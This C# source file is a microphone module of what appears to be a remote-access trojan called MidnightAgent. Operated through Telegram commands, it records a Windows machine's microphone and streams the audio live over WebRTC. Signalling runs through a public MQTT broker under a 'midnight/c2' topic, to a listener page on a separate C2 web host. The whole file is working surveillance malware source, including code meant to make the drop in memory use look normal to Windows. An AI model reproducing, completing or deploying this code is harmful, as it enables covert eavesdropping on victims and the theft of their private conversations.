using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Core;
using MidnightAgent.Telegram;
using SIPSorcery.Net;
using SIPSorceryMedia.Abstractions;
using MQTTnet;
using MQTTnet.Client;
using MQTTnet.Protocol;
using Newtonsoft.Json;

namespace MidnightAgent.Features
{
    public class MicFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "mic";
        public string Description => "Real-time WebRTC Audio (Optimized)";
        public string Usage => "/mic start | /mic stop";

        private static RTCPeerConnection _pc;
        private static IMqttClient _mqttClient;
        private static string _topicBase;
        private static CustomWaveInAudioSource _audioSource;
        private static SemaphoreSlim _lock = new SemaphoreSlim(1, 1);
        private static bool _isRunning = false;

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0) return FeatureResult.Fail(Usage);
            string action = args[0].ToLower();

            await _lock.WaitAsync();
            try
            {
                if (action == "stop")
                {
                    if (!_isRunning) return FeatureResult.Ok("⚠️ Not running.");
                    await StopStreamingInternal();
                    return FeatureResult.Ok("🛑 Stopped & Memory Released.");
                }
                if (action == "start")
                {
                    if (_isRunning) return FeatureResult.Fail("⚠️ Already running.");
                    return await StartStreamingInternal();
                }
            }
            finally
            {
                _lock.Release();
            }
            return FeatureResult.Fail(Usage);
        }

        private async Task<FeatureResult> StartStreamingInternal()
        {
            try
            {
                _isRunning = true;
                string userId = Config.UserId;
                _topicBase = $"midnight/c2/{userId}";

                var factory = new MqttFactory();
                _mqttClient = factory.CreateMqttClient();
                var options = new MqttClientOptionsBuilder()
                    .WithTcpServer("broker.hivemq.com", 1883)
                    .WithClientId($"MidnightAgent-{Guid.NewGuid()}")
                    .WithCleanSession(true) // Clean Session to avoid old messages
                    .Build();

                _mqttClient.ConnectedAsync += async e =>
                {
                    await _mqttClient.SubscribeAsync($"{_topicBase}/call");
                    await _mqttClient.SubscribeAsync($"{_topicBase}/answer");
                    await _mqttClient.SubscribeAsync($"{_topicBase}/ice");
                };

                _mqttClient.ApplicationMessageReceivedAsync += HandleSignalingMessage;
                await _mqttClient.ConnectAsync(options);

                string url = $"https://midnightc2.netlify.app/listener?id={userId}";
                string nick = NickFeature.GetNickname();
                string display = string.IsNullOrEmpty(nick) ? userId : $"{userId} ({nick})";
                
                return FeatureResult.Ok($"🎙️ <b>WebRTC Ready!</b>\nID: <code>{display}</code>\n🎧 <a href=\"{url}\"><b>Common Listen</b></a>");
            }
            catch (Exception ex)
            {
                await StopStreamingInternal();
                return FeatureResult.Fail($"❌ Error: {ex.Message}");
            }
        }

        private async Task HandleSignalingMessage(MqttApplicationMessageReceivedEventArgs e)
        {
            _ = Task.Run(async () =>
            {
                try
                {
                    string topic = e.ApplicationMessage.Topic;
                    string payload = Encoding.UTF8.GetString(e.ApplicationMessage.Payload);
                    
                    if (topic.EndsWith("/call"))
                    {
                        await _lock.WaitAsync();
                        try { await CreatePeerConnection(); }
                        finally { _lock.Release(); }

                        var offer = _pc.createOffer(null);
                        await _pc.setLocalDescription(offer);
                        await SendMqtt($"{_topicBase}/offer", offer.sdp);
                    }
                    else if (topic.EndsWith("/answer"))
                    {
                        if (_pc != null)
                            _pc.setRemoteDescription(new RTCSessionDescriptionInit { sdp = payload, type = RTCSdpType.answer });
                    }
                    else if (topic.EndsWith("/ice"))
                    {
                        if (_pc != null && !string.IsNullOrEmpty(payload))
                        {
                            try {
                                var ice = JsonConvert.DeserializeObject<RTCIceCandidateInit>(payload);
                                if (ice != null) _pc.addIceCandidate(ice);
                            } catch { } 
                        }
                    }
                }
                catch { }
            });
        }

        private async Task CreatePeerConnection()
        {
             // Cleanup old PC first
             CleanupPeerConnection();

             // Re-create Audio Source
             if (_audioSource != null)
             {
                 await _audioSource.CloseAudio();
                 _audioSource = null;
             }
             _audioSource = new CustomWaveInAudioSource();

             var config = new RTCConfiguration
             {
                 iceServers = new List<RTCIceServer> 
                 { 
                     new RTCIceServer { urls = "stun:stun.l.google.com:19302" },
                     new RTCIceServer { urls = "stun:stun1.l.google.com:19302" },
                     new RTCIceServer { urls = "stun:stun2.l.google.com:19302" },
                 }
             };
             _pc = new RTCPeerConnection(config);

             var audioFormat = new AudioFormat(SDPWellKnownMediaFormatsEnum.PCMU);
             var sdpFormat = new SDPAudioVideoMediaFormat(audioFormat);
             var formats = new List<SDPAudioVideoMediaFormat> { sdpFormat };
             var audioTrack = new MediaStreamTrack(SDPMediaTypesEnum.audio, false, formats);
             _pc.addTrack(audioTrack);

             _audioSource.OnAudioSourceEncodedSample += _pc.SendAudio;
             await _audioSource.StartAudio();

             _pc.onicecandidate += OnIceCandidate;
             _pc.onconnectionstatechange += OnConnectionStateChange;
        }

        private void OnIceCandidate(RTCIceCandidate candidate)
        {
             if (candidate != null)
             {
                 var iceJson = JsonConvert.SerializeObject(new { candidate = candidate.candidate, sdpMid = candidate.sdpMid, sdpMLineIndex = candidate.sdpMLineIndex });
                 _ = SendMqtt($"{_topicBase}/ice_agent", iceJson);
             }
        }

        private void OnConnectionStateChange(RTCPeerConnectionState state)
        {
             if (state == RTCPeerConnectionState.connected) TelegramInstance.SendMessage("✅ <b>Connected!</b>");
        }

        private void CleanupPeerConnection()
        {
            if (_pc != null)
            {
                // Unsubscribe Events to break references
                _pc.onicecandidate -= OnIceCandidate;
                _pc.onconnectionstatechange -= OnConnectionStateChange;
                
                _pc.Close("stop");
                _pc.Dispose();
                _pc = null;
            }
        }

        private async Task SendMqtt(string topic, string payload)
        {
            if (_mqttClient != null && _mqttClient.IsConnected)
            {
                var msg = new MqttApplicationMessageBuilder().WithTopic(topic).WithPayload(payload).WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtMostOnce).Build();
                await _mqttClient.PublishAsync(msg);
            }
        }

        private async Task StopStreamingInternal()
        {
            _isRunning = false;

            // 1. Stop Audio Source & Unsubscribe
            if (_audioSource != null)
            {
                if (_pc != null) _audioSource.OnAudioSourceEncodedSample -= _pc.SendAudio;
                await _audioSource.CloseAudio();
                _audioSource = null;
            }

            // 2. Stop PeerConnection & Unsubscribe
            CleanupPeerConnection();

            // 3. Stop MQTT & Unsubscribe
            if (_mqttClient != null)
            {
                _mqttClient.ApplicationMessageReceivedAsync -= HandleSignalingMessage;
                await _mqttClient.DisconnectAsync();
                _mqttClient.Dispose();
                _mqttClient = null;
            }
            
            // 4. Force GC Aggressively
            GC.Collect(2, GCCollectionMode.Forced);
            GC.WaitForPendingFinalizers();
            GC.Collect(2, GCCollectionMode.Forced);
            
            // 5. Shrink Working Set (Optional - helps Windows see the RAM drop)
            try { SetProcessWorkingSetSize(System.Diagnostics.Process.GetCurrentProcess().Handle, -1, -1); } catch { }
        }

        [DllImport("kernel32.dll")]
        static extern bool SetProcessWorkingSetSize(IntPtr hProcess, int dwMinimumWorkingSetSize, int dwMaximumWorkingSetSize);
    }

    public class CustomWaveInAudioSource : IAudioSource
    {
        public event EncodedSampleDelegate OnAudioSourceEncodedSample;
        public event Action<EncodedAudioFrame> OnAudioSourceEncodedFrameReady;
        public event RawAudioSampleDelegate OnAudioSourceRawSample;
        public event SourceErrorDelegate OnAudioSourceError;

        private WaveInRecorder _recorder;

        public CustomWaveInAudioSource()
        {
            _recorder = new WaveInRecorder(OnWaveInData);
        }

        public Task StartAudio()
        {
            _recorder.Start();
            return Task.CompletedTask;
        }

        public Task CloseAudio()
        {
            _recorder.Stop(); // Ensure handled
            return Task.CompletedTask;
        }

        // Unused stubs
        public Task PauseAudio() => Task.CompletedTask;
        public Task ResumeAudio() => Task.CompletedTask;
        public List<AudioFormat> GetAudioSourceFormats() => new List<AudioFormat> { new AudioFormat(SDPWellKnownMediaFormatsEnum.PCMU) };
        public void SetAudioSourceFormat(AudioFormat audioFormat) { }
        public void RestrictFormats(Func<AudioFormat, bool> filter) { }
        public void ExternalAudioSourceRawSample(AudioSamplingRatesEnum samplingRate, uint durationMilliseconds, short[] sample) { }
        public bool HasEncodedAudioSubscribers() => OnAudioSourceEncodedSample != null;
        public bool IsAudioSourcePaused() => false;

        private void OnWaveInData(byte[] pcmData)
        {
            // Encode PCM (16bit) -> G.711 u-law (8bit)
            byte[] encoded = MuLawEncoder.Encode(pcmData);
            OnAudioSourceEncodedSample?.Invoke((uint)encoded.Length, encoded);
        }
    }

    public static class MuLawEncoder
    {
        public static byte[] Encode(byte[] pcmData)
        {
            byte[] encoded = new byte[pcmData.Length / 2];
            int outIndex = 0;
            for (int i = 0; i < pcmData.Length; i += 2)
            {
                encoded[outIndex++] = LinearToMuLaw(BitConverter.ToInt16(pcmData, i));
            }
            return encoded;
        }
        private static byte LinearToMuLaw(short sample)
        {
            const int BIAS = 0x84;
            const int CLIP = 32635;
            int sign = (sample >> 8) & 0x80;
            if (sample < 0) sample = (short)-sample;
            if (sample > CLIP) sample = CLIP;
            sample = (short)(sample + BIAS);
            int exponent = 7;
            for (int expMask = 0x4000; (sample & expMask) == 0 && exponent > 0; exponent--, expMask >>= 1) { }
            int mantissa = (sample >> (exponent + 3)) & 0x0F;
            byte mulaw = (byte)(sign | (exponent << 4) | mantissa);
            return (byte)~mulaw;
        }
    }

    // --- Optimized WinMM Recorder ---
    public class WaveInRecorder : IDisposable
    {
        [DllImport("winmm.dll")] private static extern int waveInOpen(out IntPtr hWaveIn, int uDeviceID, ref WAVEFORMATEX lpFormat, WaveDelegate dwCallback, IntPtr dwInstance, int dwFlags);
        [DllImport("winmm.dll")] private static extern int waveInPrepareHeader(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")] private static extern int waveInUnprepareHeader(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")] private static extern int waveInAddBuffer(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")] private static extern int waveInStart(IntPtr hWaveIn);
        [DllImport("winmm.dll")] private static extern int waveInStop(IntPtr hWaveIn);
        [DllImport("winmm.dll")] private static extern int waveInReset(IntPtr hWaveIn);
        [DllImport("winmm.dll")] private static extern int waveInClose(IntPtr hWaveIn);

        private delegate void WaveDelegate(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2);
        private WaveDelegate _waveDelegate; // Keep reference to prevent GC

        [StructLayout(LayoutKind.Sequential)] public struct WAVEFORMATEX { public short wFormatTag; public short nChannels; public int nSamplesPerSec; public int nAvgBytesPerSec; public short nBlockAlign; public short wBitsPerSample; public short cbSize; }
        [StructLayout(LayoutKind.Sequential)] public struct WAVEHDR { public IntPtr lpData; public int dwBufferLength; public int dwBytesRecorded; public IntPtr dwUser; public int dwFlags; public int dwLoops; public IntPtr lpNext; public IntPtr reserved; }

        private const int MM_WIM_DATA = 0x3C0;
        private IntPtr _hWaveIn;
        private Action<byte[]> _callback;
        private bool _recording = false;
        private List<IntPtr> _headers = new List<IntPtr>();
        
        // 20ms buffer @ 8kHz 16bit = 320 bytes. 
        // 3 Buffers for smooth streaming.
        private const int BUFFER_SIZE = 320; 
        private const int NUM_BUFFERS = 3;

        public WaveInRecorder(Action<byte[]> callback)
        {
            _callback = callback;
        }

        public void Start()
        {
            if (_recording) return;

            WAVEFORMATEX fmt = new WAVEFORMATEX();
            fmt.wFormatTag = 1; // PCM
            fmt.nChannels = 1; 
            fmt.nSamplesPerSec = 8000; 
            fmt.wBitsPerSample = 16;
            fmt.nBlockAlign = (short)(fmt.nChannels * fmt.wBitsPerSample / 8); 
            fmt.nAvgBytesPerSec = fmt.nSamplesPerSec * fmt.nBlockAlign; 
            fmt.cbSize = 0;

            _waveDelegate = new WaveDelegate(WaveInProc);
            int res = waveInOpen(out _hWaveIn, -1, ref fmt, _waveDelegate, IntPtr.Zero, 0x00030000); // CALLBACK_FUNCTION
            if (res != 0) return;

            for (int i = 0; i < NUM_BUFFERS; i++)
            {
                WAVEHDR hdr = new WAVEHDR();
                hdr.dwBufferLength = BUFFER_SIZE;
                hdr.lpData = Marshal.AllocHGlobal(BUFFER_SIZE);
                
                IntPtr pHdr = Marshal.AllocHGlobal(Marshal.SizeOf(hdr));
                Marshal.StructureToPtr(hdr, pHdr, false);
                
                waveInPrepareHeader(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
                waveInAddBuffer(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
                _headers.Add(pHdr);
            }

            waveInStart(_hWaveIn);
            _recording = true;
        }

        private void WaveInProc(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2)
        {
            if (uMsg == MM_WIM_DATA && _recording)
            {
                try
                {
                    WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(dwParam1, typeof(WAVEHDR));
                    if (hdr.dwBytesRecorded > 0)
                    {
                        byte[] buf = new byte[hdr.dwBytesRecorded];
                        Marshal.Copy(hdr.lpData, buf, 0, hdr.dwBytesRecorded);
                        _callback?.Invoke(buf);
                    }
                    if (_recording)
                    {
                        waveInAddBuffer(hWaveIn, dwParam1, Marshal.SizeOf(hdr));
                    }
                }
                catch { }
            }
        }

        public void Stop()
        {
            if (!_recording) return;
            _recording = false;
            
            try 
            {
                waveInReset(_hWaveIn);
                waveInClose(_hWaveIn);
            } 
            catch { }
            
            Dispose();
        }

        public void Dispose()
        {
            if (_headers == null) return;
            foreach (var pHdr in _headers)
            {
                try
                {
                    // Unprepare and Free
                    WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(pHdr, typeof(WAVEHDR));
                    waveInUnprepareHeader(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
                    
                    if (hdr.lpData != IntPtr.Zero) 
                    {
                        Marshal.FreeHGlobal(hdr.lpData);
                        hdr.lpData = IntPtr.Zero;
                    }
                    Marshal.DestroyStructure(pHdr, typeof(WAVEHDR)); // Important!
                    Marshal.FreeHGlobal(pHdr);
                }
                catch { }
            }
            _headers.Clear();
            _hWaveIn = IntPtr.Zero;
        }
    }
}
